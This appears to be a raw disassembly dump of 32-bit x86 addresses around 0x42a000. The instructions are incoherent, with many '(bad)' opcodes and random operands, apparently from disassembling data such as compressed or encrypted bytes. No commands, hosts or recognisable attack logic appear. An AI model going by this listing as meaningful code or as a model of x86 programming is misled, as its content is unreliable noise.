  429f3f:	(bad)  [eax]
  429f41:	inc    edi
  429f42:	out    0x80,eax
  429f44:	xor    esi,esp
  429f46:	jle    0x429f15
  429f48:	repz inc edx
  429f4a:	cwde   
  429f4b:	xor    dl,0x8e
  429f4e:	dec    edx
  429f4f:	push   esi
  429f50:	push   0xffffffdb
  429f52:	stos   DWORD PTR es:[edi],eax
  429f53:	icebp  
  429f54:	cld    
  429f55:	add    BYTE PTR [ecx+0x6168e6cf],ch
  429f5b:	or     eax,0x83247144
  429f60:	fs out 0x91,al
  429f63:	fisttp WORD PTR [ecx-0x49]
  429f66:	iret   
  429f67:	inc    eax
  429f68:	fbld   TBYTE PTR [ecx]
  429f6a:	jge    0x429f6a
  429f6c:	mov    ah,0x8d
	...
  429fd6:	xor    DWORD PTR [ebp-0x38],eax
  429fd9:	push   es
  429fda:	cld    
  429fdb:	(bad)  
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx+0x1fa6f98]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	aam    0x3
  429ff0:	cwde   
  429ff1:	cld    
  429ff2:	shl    DWORD PTR [edi],1
  429ff4:	add    ecx,DWORD PTR [eax]
  429ff6:	in     eax,dx
  429ff7:	frstor [eax-0x71]
  429ffa:	inc    eax
  429ffb:	jmp    0x42a06a
  429ffd:	pop    edi
  429ffe:	add    eax,0xa73549e4
  42a003:	cmp    esp,ecx
  42a005:	and    ebx,DWORD PTR [ebx+0x6]
  42a008:	icebp  
  42a009:	ret    
  42a00a:	mov    edi,0x900460fb
  42a00f:	mov    edx,DWORD PTR [edi+ebx*2+0x6b7e6d41]
  42a016:	inc    ecx
  42a017:	cli    
  42a018:	enter  0x7c30,0xd5
  42a01c:	push   ebx
  42a01d:	inc    esi
  42a01e:	lock push ecx
  42a020:	inc    eax
  42a021:	sub    ebp,esi
  42a023:	xor    bl,BYTE PTR [eax]
  42a025:	push   es
  42a026:	inc    ebx
  42a027:	clc    
  42a028:	push   eax
  42a029:	mov    BYTE PTR [edx-0x7b],0x55
  42a02d:	lods   al,BYTE PTR ds:[esi]
  42a02e:	xchg   edx,eax
  42a02f:	mov    ds:0xf540b1e5,al
  42a034:	jmp    0x903f5ca3
  42a039:	pop    ss
  42a03a:	enter  0xf5d,0xaa
  42a03e:	mov    edx,0xdf1b2b0a
  42a043:	stos   DWORD PTR es:[edi],eax
  42a044:	pop    ebx
  42a045:	or     eax,0x62b17592
  42a04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a04b:	push   ecx
  42a04c:	arpl   WORD PTR [edx+0x3e7c4e9f],sp
  42a052:	out    0xfe,al
  42a054:	xchg   edx,eax
  42a055:	jne    0x42a01d
  42a057:	scas   eax,DWORD PTR es:[edi]
  42a058:	call   0x258a:0x5776e97c
  42a05f:	lods   al,BYTE PTR ds:[esi]
  42a060:	mov    bl,0xdc
  42a062:	stc    
  42a063:	test   al,0x50
  42a065:	or     bh,dh
  42a067:	lock mov ecx,0xab324df1
  42a06d:	popf   
  42a06e:	or     ecx,DWORD PTR [ebx+ebx*8]
  42a071:	js     0x42a05e
  42a073:	test   eax,0x5fe61271
  42a078:	mov    DWORD PTR [edx],ecx
  42a07a:	xchg   BYTE PTR [edx+0x13],bh
  42a07d:	mov    bl,0xce
  42a07f:	inc    edi
  42a080:	and    esi,ebp
  42a082:	dec    ecx
  42a083:	push   esi
  42a084:	mov    bl,0x3b
  42a086:	out    dx,al
  42a087:	mov    esi,0xc7ccb298
  42a08c:	mov    ds:0x319c1bea,al
  42a091:	loop   0x42a0ba
  42a093:	pop    edx
  42a094:	jne    0x42a020
  42a096:	sub    edi,DWORD PTR [esi-0x36]
  42a099:	enter  0xe5be,0x5a
  42a09d:	lods   al,BYTE PTR ds:[esi]
  42a09e:	push   0xffffffd6
  42a0a0:	xchg   esp,eax
  42a0a1:	and    BYTE PTR [esi+0x6a1e90db],al
  42a0a7:	dec    ebp
  42a0a8:	mov    ch,0xae
  42a0aa:	ret    0xa57e
  42a0ad:	jb     0x42a0bf
  42a0af:	repz aas 
  42a0b1:	lea    esi,[esi+eiz*8-0x5]
  42a0b5:	ror    BYTE PTR [ecx+0x49fde608],0x8e
  42a0bc:	sbb    bl,ch
  42a0be:	pop    esp
  42a0bf:	mov    ch,0xe2
  42a0c1:	push   ds
  42a0c2:	retf   
  42a0c3:	out    dx,eax
  42a0c4:	adc    ecx,0x6fec5130
  42a0ca:	nop
  42a0cb:	push   ss
  42a0cc:	int3   
  42a0cd:	inc    esp
  42a0ce:	(bad)  
  42a0cf:	icebp  
  42a0d0:	mov    dl,BYTE PTR [eax+eax*2-0x6d111a02]
  42a0d7:	scas   al,BYTE PTR es:[edi]
  42a0d8:	sbb    ch,dh
  42a0da:	lods   al,BYTE PTR ds:[esi]
  42a0db:	dec    ebx
  42a0dc:	pop    es
  42a0dd:	adc    edx,DWORD PTR [ebx+0x6c]
  42a0e0:	int    0x54
  42a0e2:	ss clc 
  42a0e4:	sbb    ebx,eax
  42a0e6:	or     BYTE PTR [edx],dh
  42a0e8:	sub    DWORD PTR [ebp-0x2f],0x4de81
	...
  42a153:	add    BYTE PTR [eax],al
  42a155:	add    bh,dl
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	sahf   
  42a163:	mov    ebp,0xc367058f
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	sar    DWORD PTR es:[ecx-0x1e],0xc9
  42a173:	or     edi,DWORD PTR [ebx-0x1f40af92]
  42a179:	ds dec esp
  42a17b:	sub    BYTE PTR [ebx],al
  42a17d:	or     edi,DWORD PTR ds:0xd3174e7f
  42a183:	inc    edx
  42a184:	jae    0x42a14c
  42a186:	xor    al,0x78
  42a188:	(bad)  
  42a189:	js     0x42a1aa
  42a18b:	sub    DWORD PTR cs:[edx-0x7e598b1a],0x868ef0d6
  42a196:	mov    ?,WORD PTR [edi-0x26]
  42a199:	pop    esi
  42a19a:	pop    ds
  42a19b:	sub    BYTE PTR [esi-0x7af99199],ch
  42a1a1:	and    dl,BYTE PTR [edx]
  42a1a3:	mov    eax,DWORD PTR [edx]
  42a1a5:	jnp    0x42a15f
  42a1a7:	xchg   edi,eax
  42a1a8:	push   eax
  42a1a9:	pushf  
  42a1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1ab:	inc    ebp
  42a1ac:	retf   0x1ac7
  42a1af:	dec    edi
  42a1b0:	fistp  QWORD PTR [ebp-0x43ffef84]
  42a1b6:	shr    DWORD PTR [ecx],0xef
  42a1b9:	data16 (bad) 
  42a1bb:	(bad)
  42a1be:	jp     0x42a1df
  42a1c0:	pop    ebx
  42a1c1:	les    ebx,FWORD PTR [ebx]
  42a1c3:	mov    edi,0xd737e0af
  42a1c8:	mov    ds,esi
  42a1ca:	in     al,dx
  42a1cb:	xchg   ecx,eax
  42a1cc:	in     eax,dx
  42a1cd:	mov    BYTE PTR [eax],dl
  42a1cf:	daa    
  42a1d0:	jl     0x42a196
  42a1d2:	cmp    DWORD PTR [eax-0x4ab4e994],ecx
  42a1d8:	retf   
  42a1d9:	inc    esp
  42a1da:	dec    edi
  42a1db:	inc    edx
  42a1dc:	inc    eax
  42a1dd:	cmp    ebx,DWORD PTR [ebx]
  42a1df:	and    ch,dh
  42a1e1:	scas   al,BYTE PTR es:[edi]
  42a1e2:	sub    BYTE PTR [edx-0x5047d8b6],ah
  42a1e8:	lds    esi,FWORD PTR [edx-0x4e38d450]
  42a1ee:	(bad)  
  42a1ef:	jo     0x42a265
  42a1f1:	(bad)  
  42a1f2:	adc    BYTE PTR [ecx],ah
  42a1f4:	les    edi,FWORD PTR [edi]
  42a1f6:	sar    BYTE PTR [ebx],1
  42a1f8:	das    
  42a1f9:	jmp    0x42a1b9
  42a1fb:	retf   0xccc8
  42a1fe:	xor    DWORD PTR [ebp+ebx*1-0x4e],eax
  42a202:	mov    eax,ss:0xe495d217
  42a208:	xchg   esi,eax
  42a209:	push   ss
  42a20a:	leave  
  42a20b:	shr    eax,0x41
  42a20e:	and    ebx,DWORD PTR [edx+0x57]
  42a211:	(bad)
  42a214:	fisttp QWORD PTR [ecx]
  42a216:	mov    ds:0x42896c9,eax
  42a21b:	in     al,dx
  42a21c:	push   ss
  42a21d:	jmp    0x42a1c8
  42a21f:	and    esp,DWORD PTR [edx+0xba5b0ba]
  42a225:	mov    WORD PTR [edi],ds
  42a227:	add    DWORD PTR [edi+esi*8-0x1b8d408b],0xffffffd0
  42a22f:	sbb    ch,BYTE PTR [ebx]
  42a231:	dec    edx
  42a232:	iret   
  42a233:	jmp    0x7ec1:0x59818df5
  42a23a:	icebp  
  42a23b:	mov    eax,cs:0x1697477f
  42a241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a242:	cmp    ch,cl
  42a244:	imul   edx,DWORD PTR [ebp+0x30],0xffffffe7
  42a248:	or     eax,ebx
  42a24a:	stos   BYTE PTR es:[edi],al
  42a24b:	and    DWORD PTR [eax+edi*2-0x6f],esp
  42a24f:	test   BYTE PTR [eax+0x70],0x10
  42a253:	cmp    ah,BYTE PTR [esi+0x6c]
  42a256:	out    0x84,eax
  42a258:	neg    BYTE PTR [ecx]
  42a25a:	pop    ds
  42a25b:	sti    
  42a25c:	jge    0x42a1ec
  42a25e:	fdivr  st(4),st
  42a260:	sbb    ebx,ebp
  42a262:	jmp    0x42a23d
  42a264:	sbb    eax,0x106eeec6
  42a269:	outs   dx,BYTE PTR ds:[esi]
  42a26a:	or     eax,0xdd7d2f
	...
  42a2d3:	add    BYTE PTR [eax],al
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	frndint 
  42a2e3:	sar    DWORD PTR [eax],cl
  42a2e5:	push   ebp
  42a2e6:	les    eax,FWORD PTR [bx+di]
  42a2e9:	add    BYTE PTR [eax],al
  42a2eb:	add    DWORD PTR [eax],eax
  42a2ed:	add    BYTE PTR [eax-0x53],bh
  42a2f0:	sbb    BYTE PTR [edi],bh
  42a2f2:	int3   
  42a2f3:	inc    ebp
  42a2f4:	or     al,0x4b
  42a2f6:	popa   
  42a2f7:	mov    ebp,esp
  42a2f9:	(bad)  
  42a2fa:	(bad)  
  42a2fb:	loope  0x42a371
  42a2fd:	div    BYTE PTR [esi-0x75]
  42a300:	imul   edi,esi,0x6efc771e
  42a306:	out    0xa3,al
  42a308:	add    bh,ch
  42a30a:	mov    bh,0x46
  42a30c:	out    0x56,al
  42a30e:	pop    ds
  42a30f:	es stos DWORD PTR es:[edi],eax
  42a311:	cmp    eax,0x6eed497b
  42a316:	stos   DWORD PTR es:[edi],eax
  42a317:	test   DWORD PTR [ecx-0x59],edi
  42a31a:	pop    esi
  42a31b:	or     DWORD PTR [eax-0x6b75c558],eax
  42a321:	adc    ah,BYTE PTR ds:0x2e9cb7eb
  42a327:	mov    eax,DWORD PTR [esi+esi*4]
  42a32a:	das    
  42a32b:	rcr    BYTE PTR [ebx+0x66c7154d],cl
  42a331:	es jmp eax
  42a334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a335:	daa    
  42a336:	jae    0x42a2b9
  42a338:	(bad)  
  42a339:	lock scas eax,DWORD PTR es:[edi]
  42a33b:	retf   0x27fe
  42a33e:	xor    DWORD PTR [ebp-0x5d076859],0x41
  42a345:	call   0xfd25e930
  42a34a:	(bad)  [ebx]
  42a34c:	arpl   WORD PTR [ecx-0x5a219fcd],cx
  42a352:	sar    DWORD PTR [eax+esi*2-0x696b3bc0],cl
  42a359:	jg     0x42a323
  42a35b:	xor    BYTE PTR [ebx+0x4226d9df],dh
  42a361:	dec    esp
  42a362:	inc    ecx
  42a363:	and    ch,bh
  42a365:	cdq    
  42a366:	xchg   BYTE PTR [esi+0x3a843de4],bl
  42a36c:	scas   al,BYTE PTR es:[edi]
  42a36d:	inc    ebp
  42a36e:	inc    eax
  42a36f:	and    BYTE PTR [ebp-0x70],bh
  42a372:	add    al,0x1c
  42a374:	adc    al,0x2c
  42a376:	mov    dl,0xd4
  42a378:	int3   
  42a379:	push   edx
  42a37a:	mov    edi,0xe470f961
  42a37f:	faddp  st(5),st
  42a381:	and    BYTE PTR [edx],0x89
  42a384:	cmp    DWORD PTR [ebx],edi
  42a386:	mov    dl,0x19
  42a388:	repnz data16 mov al,0xc5
  42a38c:	jne    0x42a340
  42a38e:	jne    0x42a3ee
  42a390:	xor    dl,BYTE PTR [ecx-0x4dbfd520]
  42a396:	jae    0x42a318
  42a398:	and    al,0x5d
  42a39a:	push   ds
  42a39b:	mov    dh,0xb0
  42a39d:	sbb    eax,0x4e134941
  42a3a2:	out    0x5e,al
  42a3a4:	sub    eax,esi
  42a3a6:	mov    bl,0xd7
  42a3a8:	sbb    ecx,ebp
  42a3aa:	inc    esp
  42a3ab:	mov    ah,0x8c
  42a3ad:	ret    0xb7a5
  42a3b0:	mov    al,0xcb
  42a3b2:	add    BYTE PTR [edx+edi*4-0x45f78256],0xaf
  42a3ba:	inc    edx
  42a3bb:	cmc    
  42a3bc:	imul   si,WORD PTR [eax],0xff87
  42a3c0:	loope  0x42a3d9
  42a3c2:	pushf  
  42a3c3:	scas   eax,DWORD PTR es:[edi]
  42a3c4:	mul    DWORD PTR [edx]
  42a3c6:	mov    bl,0x8
  42a3c8:	dec    esi
  42a3c9:	pop    ds
  42a3ca:	retf   0x8aff
  42a3cd:	fdiv   QWORD PTR [ebx+edi*8+0x6b0b4089]
  42a3d4:	xchg   ecx,eax
  42a3d5:	les    ebp,FWORD PTR [eax-0x2eea4892]
  42a3db:	lea    eax,[ebp-0x31be82a2]
  42a3e1:	lds    edx,FWORD PTR [ecx-0x4a58a85f]
  42a3e7:	xchg   dl,cl
  42a3e9:	out    dx,eax
  42a3ea:	push   ss
  42a3eb:	dec    ecx
  42a3ec:	test   DWORD PTR [ebx],ebp
	...
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0xb1b5153d
  42a465:	mov    WORD PTR [edi-0x3b],fs
  42a468:	add    DWORD PTR [eax],eax
  42a46a:	add    BYTE PTR [ecx],al
  42a46c:	add    BYTE PTR [eax],al
  42a46e:	je     0x42a3f6
  42a470:	mov    WORD PTR [esi+0x3fc80e5d],?
  42a476:	sbb    cl,BYTE PTR [ebx-0x39]
  42a479:	fnstenv ds:0xdc19c0a3
  42a47f:	push   esp
  42a480:	rcl    DWORD PTR [ecx+0x11351880],cl
  42a486:	sub    BYTE PTR [edi+esi*1-0x29094102],0x69
  42a48e:	inc    ebx
  42a48f:	js     0x42a494
  42a491:	jle    0x42a468
  42a493:	mov    eax,ds:0xec1643d1
  42a498:	xor    bl,0x60
  42a49b:	mov    eax,0x4960b2e2
  42a4a0:	rcr    BYTE PTR [eax-0x65],0x6e
  42a4a4:	mov    ah,0x75
  42a4a6:	mov    cl,0xbe
  42a4a8:	push   ds
  42a4a9:	xor    ah,BYTE PTR [edx+0x79478e79]
  42a4af:	test   eax,0x9610ed98
  42a4b4:	sbb    al,0x5b
  42a4b6:	mov    DWORD PTR [edx],esi
  42a4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4b9:	pop    es
  42a4ba:	mov    BYTE PTR [ebp+0x6249ea6f],ch
  42a4c0:	jno    0x42a4fe
  42a4c2:	ins    BYTE PTR es:[edi],dx
  42a4c3:	movntps XMMWORD PTR [ebx],xmm4
  42a4c6:	mov    ah,0xe7
  42a4c8:	aaa    
  42a4c9:	pusha  
  42a4ca:	pushf  
  42a4cb:	add    al,BYTE PTR [eax+0x3c]
  42a4ce:	add    edx,DWORD PTR [eax-0x7c8c12ee]
  42a4d4:	or     al,0x9c
  42a4d6:	repz cs aas 
  42a4d9:	nop
  42a4da:	aaa    
  42a4db:	mov    bl,0xf1
  42a4dd:	aam    0xc
  42a4df:	dec    edx
  42a4e0:	xchg   edi,eax
  42a4e1:	loopne 0x42a4a8
  42a4e3:	fwait
  42a4e4:	adc    DWORD PTR [edx-0x5],esp
  42a4e7:	xchg   ebp,eax
  42a4e8:	retf   
  42a4e9:	test   DWORD PTR [ecx+0x11],eax
  42a4ec:	(bad)  
  42a4ed:	sbb    al,0x72
  42a4ef:	sub    bh,BYTE PTR [esi-0x17]
  42a4f2:	xor    DWORD PTR gs:[edi],edi
  42a4f5:	pop    eax
  42a4f6:	push   ebp
  42a4f7:	xor    BYTE PTR ds:0x9121ed4b,cl
  42a4fd:	mov    dh,BYTE PTR [eax+0x12]
  42a500:	shr    DWORD PTR [edx+0x56],cl
  42a503:	mov    WORD PTR [eax],?
  42a505:	ret    
  42a506:	and    eax,0x38b34a0d
  42a50b:	jb     0x42a492
  42a50d:	pop    DWORD PTR ds:0x95292fa4
  42a513:	jne    0x42a522
  42a515:	jo     0x42a4ed
  42a517:	lods   eax,DWORD PTR ds:[esi]
  42a518:	add    al,BYTE PTR [ecx+edi*8+0x2a]
  42a51c:	sub    al,0xfb
  42a51e:	xchg   edx,eax
  42a51f:	inc    BYTE PTR [edx+0x50]
  42a522:	push   esi
  42a523:	push   0x80661bd2
  42a528:	mov    edx,0xaa019d0d
  42a52d:	mov    esp,0xe60a3756
  42a532:	stc    
  42a533:	cmp    eax,0xbafb41ea
  42a538:	dec    ecx
  42a539:	mov    DWORD PTR [ecx],esp
  42a53b:	or     al,0xee
  42a53d:	or     dl,cl
  42a53f:	ds iret 
  42a541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a542:	push   edx
  42a543:	inc    dh
  42a545:	push   0x4aa06710
  42a54a:	pusha  
  42a54b:	sti    
  42a54c:	fucomp st(2)
  42a54e:	cmp    ecx,DWORD PTR [ecx]
  42a550:	xor    BYTE PTR [ecx],cl
  42a552:	pop    ebp
  42a553:	xor    al,0xe8
  42a555:	mov    edx,0xb8e01ba5
  42a55a:	and    al,0x45
  42a55c:	or     BYTE PTR [eax-0x62c3d46b],ah
  42a562:	imul   esp,DWORD PTR [edi-0x2f],0xba49bdb
  42a569:	adc    ecx,DWORD PTR [ecx+0x4b]
  42a56c:	add    BYTE PTR [eax+0x0],al
	...
  42a5d6:	sbb    BYTE PTR [edi+0x17],cl
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x495be59f
  42a5e5:	mov    edi,0x1c667
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	std    
  42a5ef:	int3   
  42a5f0:	push   esp
  42a5f1:	jp     0x42a5b5
  42a5f3:	mov    edi,0x485ae84b
  42a5f8:	push   ebp
  42a5f9:	arpl   si,sp
  42a5fb:	cmp    dh,al
  42a5fd:	in     eax,dx
  42a5fe:	mov    ds:0xf5c47188,eax
  42a603:	sub    esp,edi
  42a605:	jne    0x42a66b
  42a607:	dec    eax
  42a608:	dec    ebx
  42a609:	cmc    
  42a60a:	aam    0x9e
  42a60c:	dec    edx
  42a60d:	push   eax
  42a60e:	mov    cl,BYTE PTR [ebp-0xec16b30]
  42a614:	loop   0x42a5c8
  42a616:	inc    esi
  42a617:	clc    
  42a618:	ss bnd ret 
  42a61b:	bnd jp 0x42a658
  42a61e:	adc    esi,DWORD PTR [eax-0x5b]
  42a621:	mov    edx,0x72088759
  42a626:	or     esp,DWORD PTR [eax]
  42a628:	in     al,dx
  42a629:	or     bh,BYTE PTR [edx-0x1653a826]
  42a62f:	out    0x61,eax
  42a631:	outs   dx,BYTE PTR ds:[esi]
  42a632:	scas   al,BYTE PTR es:[edi]
  42a633:	add    al,0x13
  42a635:	xchg   ecx,eax
  42a636:	mov    DWORD PTR [esi-0xb6bad89],ebp
  42a63c:	les    edx,FWORD PTR [edx+0x71]
  42a63f:	jp     0x42a6a1
  42a641:	mov    esp,0xb5d02a22
  42a646:	int3   
  42a647:	int    0x96
  42a649:	sete   BYTE PTR [ecx+edi*2-0x23]
  42a64e:	fs jno 0x42a690
  42a651:	in     al,dx
  42a652:	les    edi,FWORD PTR [ebp+0x7fcb1d86]
  42a658:	das    
  42a659:	sbb    BYTE PTR [eax+0x3],al
  42a65c:	cdq    
  42a65d:	dec    ebp
  42a65e:	fnstcw WORD PTR [edx+eiz*8]
  42a661:	out    0x85,eax
  42a663:	loop   0x42a696
  42a665:	push   ecx
  42a666:	gs mov edx,0xedac2159
  42a66c:	jns    0x42a6aa
  42a66e:	out    dx,al
  42a66f:	repz dec esp
  42a671:	cmp    eax,0x5c3e562c
  42a676:	test   ecx,0x7584a77b
  42a67c:	(bad)  
  42a67d:	sti    
  42a67e:	ror    ebp,cl
  42a680:	mov    dh,0x86
  42a682:	push   0xffffff91
  42a684:	xor    BYTE PTR [esi+0x51],bh
  42a687:	out    0xff,eax
  42a689:	mov    eax,0x81f2d48f
  42a68e:	inc    BYTE PTR [ecx+0xa9b861b]
  42a694:	in     eax,dx
  42a695:	neg    DWORD PTR [eax+0x3987248f]
  42a69b:	pop    ecx
  42a69c:	pushf  
  42a69d:	inc    ecx
  42a69e:	aaa    
  42a69f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6a0:	adc    ebp,eax
  42a6a2:	icebp  
  42a6a3:	add    bl,0xd1
  42a6a6:	sbb    cl,ah
  42a6a8:	add    ah,BYTE PTR [edi+0x31]
  42a6ab:	hlt    
  42a6ac:	pop    edi
  42a6ad:	push   edi
  42a6ae:	arpl   bx,sp
  42a6b0:	inc    esi
  42a6b1:	in     eax,dx
  42a6b2:	cmc    
  42a6b3:	add    eax,0x7bfdc8f2
  42a6b8:	icebp  
  42a6b9:	mov    dl,0x1a
  42a6bb:	gs pop ecx
  42a6bd:	sub    eax,DWORD PTR [edx]
  42a6bf:	mov    ah,0x8b
  42a6c1:	xchg   edi,eax
  42a6c2:	mov    DWORD PTR [esi+0x4a96b19f],edi
  42a6c8:	arpl   WORD PTR [ebp-0xb],sp
  42a6cb:	ins    BYTE PTR es:[edi],dx
  42a6cc:	mov    esp,edi
  42a6ce:	mov    bl,0xe5
  42a6d0:	cmp    eax,0xda24dd26
  42a6d5:	rcr    BYTE PTR [ecx],cl
  42a6d7:	mov    edi,0x5fc174f4
  42a6dc:	jmp    0x7b0c9eb2
  42a6e1:	pusha  
  42a6e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a6e3:	fimul  WORD PTR [edx+esi*8-0x57]
  42a6e7:	mov    ebp,0x9b889ed0
  42a6ec:	addr16 jg 0x42a6ef
	...
  42a753:	add    BYTE PTR [eax],al
  42a755:	add    BYTE PTR [esi+edx*1],ah
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi+0x7eb8131c],0x67b02f5e
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [esi+eax*2],cl
  42a770:	retf   
  42a771:	mov    bh,dl
  42a773:	ja     0x42a7dd
  42a775:	pop    esp
  42a776:	mov    DWORD PTR [ecx+ebx*2-0x39],edi
  42a77a:	sub    eax,DWORD PTR [esi+0x75]
  42a77d:	ja     0x42a776
  42a77f:	mov    esp,0x5a3fb567
  42a784:	shl    DWORD PTR [ebp+0x3],1
  42a787:	test   DWORD PTR [esi],edx
  42a789:	jb     0x42a758
  42a78b:	call   0xbda1:0x39d71baa
  42a792:	ret    0xf5cc
  42a795:	dec    edi
  42a796:	mov    gs,WORD PTR [ebx]
  42a798:	xor    bl,BYTE PTR [edx-0x4ae0c719]
  42a79e:	push   esp
  42a79f:	test   BYTE PTR [esi],dl
  42a7a1:	xor    dl,dl
  42a7a3:	int3   
  42a7a4:	jge    0x42a7e6
  42a7a6:	add    BYTE PTR [esi],ch
  42a7a8:	pusha  
  42a7a9:	lea    ecx,[esp+ebx*8-0x3d0201b5]
  42a7b0:	in     eax,dx
  42a7b1:	jnp    0x42a7b4
  42a7b3:	bnd jae 0x42a808
  42a7b6:	add    esp,DWORD PTR [ebp+0x5759f308]
  42a7bc:	sahf   
  42a7bd:	dec    eax
  42a7be:	fimul  DWORD PTR [ecx]
  42a7c0:	adc    edx,DWORD PTR [esi+0x77]
  42a7c3:	(bad)  
  42a7c4:	imul   ebx,eax,0xffffffe0
  42a7c7:	fld    TBYTE PTR [ebx]
  42a7c9:	clc    
  42a7ca:	xor    eax,0x7270c964
  42a7cf:	int3   
  42a7d0:	push   cs
  42a7d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7d2:	sub    bh,dl
  42a7d4:	lock push esp
  42a7d6:	adc    bh,ch
  42a7d8:	or     BYTE PTR [edi],bh
  42a7da:	bound  edi,QWORD PTR [ebx]
  42a7dc:	xor    BYTE PTR [ecx-0x2f67af34],bl
  42a7e2:	lahf   
  42a7e3:	stos   DWORD PTR es:[edi],eax
  42a7e4:	fiadd  DWORD PTR [esi+ebp*8-0x5d601f5e]
  42a7eb:	outs   dx,BYTE PTR ds:[esi]
  42a7ec:	lea    ebp,[edx]
  42a7ee:	sub    DWORD PTR [esp+edi*8],0x75
  42a7f2:	pop    esi
  42a7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7f4:	xor    BYTE PTR [ebx-0xc],dl
  42a7f7:	ror    DWORD PTR [ebp+0x6b],cl
  42a7fa:	fs mov ah,0xfc
  42a7fd:	mov    ebp,0x6cb017d7
  42a802:	inc    ecx
  42a803:	adc    eax,0x5f43e09c
  42a808:	push   edi
  42a809:	add    al,BYTE PTR [ebp-0x35bb0832]
  42a80f:	dec    esp
  42a810:	outs   dx,BYTE PTR ds:[esi]
  42a811:	loop   0x42a7df
  42a813:	push   esp
  42a814:	add    edx,ebx
  42a816:	jle    0x42a83b
  42a818:	mov    eax,0xa146fc53
  42a81d:	into   
  42a81e:	in     eax,dx
  42a81f:	sbb    DWORD PTR [eax-0x2afa03a5],edi
  42a825:	fnstsw WORD PTR [ebx+0x26106e68]
  42a82b:	popa   
  42a82c:	out    dx,eax
  42a82d:	rcl    DWORD PTR gs:[ebp+0x19dbd69e],0x2
  42a835:	push   ebx
  42a836:	xor    ch,BYTE PTR [ecx]
  42a838:	jb     0x42a7d8
  42a83a:	jno    0x42a7d7
  42a83c:	add    DWORD PTR [edi],ebx
  42a83e:	adc    eax,0xcc285a32
  42a843:	sbb    bh,BYTE PTR [edx+esi*2+0x1176cd5e]
  42a84a:	shl    BYTE PTR [ecx-0x11],1
  42a84d:	ret    0x3a87
  42a850:	ret    0xfe43
  42a853:	and    BYTE PTR [edx+ebp*8-0xa441fb9],cl
  42a85a:	sbb    ebp,eax
  42a85c:	push   ds
  42a85d:	add    eax,0x9230f1e5
  42a862:	or     dh,BYTE PTR [ebx]
  42a864:	std    
  42a865:	in     eax,dx
  42a866:	and    eax,0x33ae3683
  42a86b:	sbb    al,0x83
  42a86d:	ins    DWORD PTR es:[edi],dx
	...
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0x79a06c97
  42a8e4:	xlat   BYTE PTR ds:[ebx]
  42a8e5:	retf   0xc867
  42a8e8:	add    DWORD PTR [eax],eax
  42a8ea:	add    BYTE PTR [ecx],al
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	dec    esp
  42a8ef:	test   BYTE PTR [eax],bl
  42a8f1:	loopne 0x42a90b
  42a8f3:	xor    esp,esp
  42a8f5:	stc    
  42a8f6:	mov    eax,ds:0x126fe5b8
  42a8fb:	push   ebp
  42a8fc:	dec    eax
  42a8fd:	sub    DWORD PTR [ecx],ecx
  42a8ff:	outs   dx,BYTE PTR ds:[esi]
  42a900:	mov    dl,0x19
  42a902:	rcl    BYTE PTR [esi-0x6b],0x4b
  42a906:	inc    DWORD PTR [eax-0x29]
  42a909:	test   al,0x77
  42a90b:	push   ds
  42a90c:	fistp  WORD PTR [esi]
  42a90e:	xor    eax,0x49f0624b
  42a913:	ror    BYTE PTR [esi],1
  42a915:	cwde   
  42a916:	and    BYTE PTR [esi+edx*1],bh
  42a919:	mov    al,0x2d
  42a91b:	ret    0xbbf8
  42a91e:	mov    fs,WORD PTR [eax-0x58]
  42a921:	inc    esi
  42a922:	jle    0x42a8bb
  42a924:	cwde   
  42a925:	cmc    
  42a926:	inc    ecx
  42a927:	cmp    esp,DWORD PTR [ecx-0x6]
  42a92a:	ins    DWORD PTR es:[edi],dx
  42a92b:	je     0x42a90e
  42a92d:	out    0x47,al
  42a92f:	push   es
  42a930:	call   DWORD PTR [eax+0x7f467b05]
  42a936:	or     ebp,ebp
  42a938:	lods   al,BYTE PTR ds:[esi]
  42a939:	pop    ebx
  42a93a:	nop
  42a93b:	test   eax,0x56f7eb03
  42a940:	(bad)  
  42a941:	int    0x7f
  42a943:	es jle 0x42a95d
  42a946:	out    dx,al
  42a947:	inc    ecx
  42a948:	cli    
  42a949:	push   eax
  42a94a:	lods   eax,DWORD PTR ds:[esi]
  42a94b:	and    BYTE PTR [esi],bh
  42a94d:	repz mov WORD PTR [eax],gs
  42a950:	and    ecx,edx
  42a952:	es stos DWORD PTR es:[edi],eax
